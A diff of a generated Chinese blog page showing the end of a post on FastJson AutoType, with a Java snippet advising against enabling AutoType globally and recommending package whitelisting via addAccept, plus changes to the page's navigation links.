+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局开启AutoType，不建议使用</span></span><br><span class="line"><span class="comment">// ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</span></span><br><span class="line"><span class="comment">// 建议使用这种方式，小范围指定白名单</span></span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;xxx.xxx.&quot;</span>)</span><br><span class="line"><span class="comment">// addAccept不支持通配符，可以直接指定包名，则该包下的所有类，都支持AutoType</span></span><br></pre></td></tr></table></figure>
 
 
       </div>
       <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/Spring/" class="">
-              Spring
-            </a>
-          
-        </div>
         
       </div>
       
@@ -517,7 +572,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2022/02/15/Spring/浅析ResponseBodyAdvice接口的理解和实际应用/" target="_blank" title="浅析ResponseBodyAdvice接口的理解和实际应用">http://example.com/2022/02/15/Spring/浅析ResponseBodyAdvice接口的理解和实际应用/</a>
+    <a href="/2022/02/17/第三方插件或接口/FastJson的AutoType/" target="_blank" title="FastJson的AutoType">http://example.com/2022/02/17/第三方插件或接口/FastJson的AutoType/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -535,41 +590,21 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/3.jpg" class="lazyload placeholder" data-srcset="/medias/3.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2022/02/17/%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%92%E4%BB%B6%E6%88%96%E6%8E%A5%E5%8F%A3/FastJson%E7%9A%84AutoType/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> Prev:
-        <div class="title-text">FastJson的AutoType</div>
-      </div>
-      
-      <!-- <div class="content">
-        [TOC]
-FastJson的AutoType1 AutoType解析
-参考https://juejin.cn/post
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/14.jpg" class="lazyload placeholder" data-srcset="/medias/14.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/12.jpg" class="lazyload placeholder" data-srcset="/medias/12.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2022/02/11/Git/GitHub%EF%BC%9Aremote-Support-for-password-authentication-was-removed-on-August-13,-2021/" class="post-nav-link">
+    <a href="/2022/02/15/Spring/%E6%B5%85%E6%9E%90ResponseBodyAdvice%E6%8E%A5%E5%8F%A3%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/" class="post-nav-link">
       <div class="title">
         Next: <i class="fas fa-angle-right"></i>
-        <div class="title-text">GitHub：remote：Support for password authentication was removed on August 13, 2021.</div>
+        <div class="title-text">浅析ResponseBodyAdvice接口的理解和实际应用</div>
       </div>
       <!-- <div class="content">
-        一、问题描述如果你在2021年8月14日的这一天提交代码（或者把博客部署到github)上，那么恭喜你，你就会看到这个错
+        浅析ResponseBodyAdvice接口的理解和实际应用一、官方解释官方对ResponseBodyAdvice接口类
       </div> -->
     </a>
   </div>
